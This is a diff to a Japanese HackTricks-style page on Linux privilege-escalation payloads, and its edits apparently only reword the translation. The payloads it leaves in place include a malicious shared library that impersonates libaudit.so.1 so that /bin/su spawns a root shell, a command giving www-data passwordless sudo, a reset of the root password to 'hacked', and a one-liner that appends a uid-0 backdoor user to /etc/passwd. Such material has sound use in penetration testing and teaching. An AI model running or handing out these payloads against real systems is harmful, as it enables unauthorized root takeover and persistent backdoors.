@@ -1,4 +1,4 @@
-# 実行する Payloads
+# 実行するPayload
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -44,18 +44,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## ファイルを上書きして権限を昇格する
+## 権限昇格のためのファイルの上書き
 
-### 一般的なファイル
+### よくあるファイル
 
-- パスワード付きのユーザーを _/etc/passwd_ に追加する
-- _/etc/shadow_ 内のパスワードを変更する
-- _/etc/sudoers_ の sudoers にユーザーを追加する
-- 通常は _/run/docker.sock_ または _/var/run/docker.sock_ にある Docker socket を通じて Docker を悪用する
+- パスワード付きのユーザーを _/etc/passwd_ に追加
+- _/etc/shadow_ 内のパスワードを変更
+- _/etc/sudoers_ の sudoers にユーザーを追加
+- 通常は _/run/docker.sock_ または _/var/run/docker.sock_ にある docker socket を通じて docker を悪用
 
 ### library の上書き
 
-一部の binary が使用する library を確認します。この場合は `/bin/su` です：
+この場合は `/bin/su` のように、何らかの binary が使用する library を確認します：
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-この場合は、`/lib/x86_64-linux-gnu/libaudit.so.1` になりすましてみましょう。\
-そこで、**`su`** binary が使用するこの library の functions を確認します：
+この場合は、`/lib/x86_64-linux-gnu/libaudit.so.1` を偽装してみましょう。\
+そこで、**`su`** バイナリが使用するこのライブラリの関数を確認します。
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-シンボル `audit_open`、`audit_log_acct_message`、`audit_log_acct_message`、`audit_fd` は、おそらく libaudit.so.1 ライブラリに由来します。libaudit.so.1 は悪意のある shared library によって上書きされるため、これらのシンボルは新しい shared library に存在している必要があります。そうでなければ、プログラムはシンボルを見つけられず終了します。
+シンボル `audit_open`、`audit_log_acct_message`、`audit_log_acct_message`、`audit_fd` は、おそらく libaudit.so.1 ライブラリのものです。libaudit.so.1 は悪意のある shared library によって上書きされるため、新しい shared library にこれらのシンボルが存在している必要があります。そうでなければ、プログラムはシンボルを見つけられず終了します。
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,21 +98,21 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-今、**`/bin/su`** を呼び出すだけで、root としてシェルを取得できます。
+今や、**`/bin/su`** を呼び出すだけで、root としてシェルを取得できます。
 
 ## スクリプト
 
 root に何かを実行させることはできますか？
 
-### **www-data を sudoers に**
+### **www-data を sudoers に追加**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **root passwordの変更**
+### **root passwordを変更**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### /etc/passwd に新しい root user を追加する
+### /etc/passwd に新しい root ユーザーを追加する
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
